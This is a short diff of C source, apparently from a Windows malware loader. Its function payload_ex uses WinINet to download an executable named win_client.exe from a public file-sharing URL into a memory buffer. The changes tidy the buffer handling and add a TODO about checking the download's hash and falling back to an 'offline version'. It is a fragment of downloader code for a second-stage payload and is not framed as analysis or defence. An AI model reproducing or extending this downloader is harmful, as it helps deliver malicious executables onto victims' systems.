@@ -37,6 +37,8 @@ typedef int (*GetLastRror)(void);
         FILE*,
     }
 */
+
+
 void payload_ex(unsigned long long* args){
     char url[] = "https://filebin.net/50bn0toze2ttk67a/win_client.exe";
     // char url[] = "http://ipv4.download.thinkbroadband.com/5MB.zip";
@@ -75,11 +77,18 @@ void payload_ex(unsigned long long* args){
 
         for (int i = 0; i < bytesRead; ++i){
             ret_buf[ptr++] = buffer[i];
+            buffer[i] = 0;
         }
+        bytesRead = 0;
+        // if (ptr >= 56832){
+        //     break;
+        // }
     }
+    // TODO Check hashsum of the downloaded file, in case of failure, use offline version
     *ret_sz = ptr;
     // printf("We got here\n");
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
     return;
 }
+
